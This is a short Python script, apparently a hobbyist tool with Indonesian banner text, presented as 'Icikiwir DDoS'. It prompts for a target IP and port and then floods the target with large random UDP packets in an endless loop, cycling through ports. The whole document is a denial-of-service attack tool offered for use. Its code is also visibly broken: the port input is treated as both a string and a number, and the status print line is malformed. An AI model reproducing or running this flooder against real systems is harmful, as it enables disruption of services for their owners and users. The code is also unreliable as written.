import os
import sys
import socket
import random

os.system("clear")

print(chr(27)+"[36m")
import pyfiglet
result = pyfiglet.figlet_format("Figlet Berhasil Terinstal..")
print(result)

rkt = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(51200)

banner = pyfiglet.figlet_format("Icikiwir DDoS", font = "bulbhead")
print (banner)

print

print ("    Pembuat : Aril Icikiwir")
print ("    Github : https://github.com/Pompompuriin")

print

ip = input("IP Target : ")
port = input("Port    : ")

#ip   = raw_input("IP Target : ")
#port = input    ("Port      : ")

sent = 0

while True:
     rkt.sendto(bytes,(ip,port))
     sent = sent + 1
     port = port + 1
     "SENT %s PACKET TO %s THROUGHT PORT:%s" % print(sent,ip,port)
     if port == 65535:
       port = 1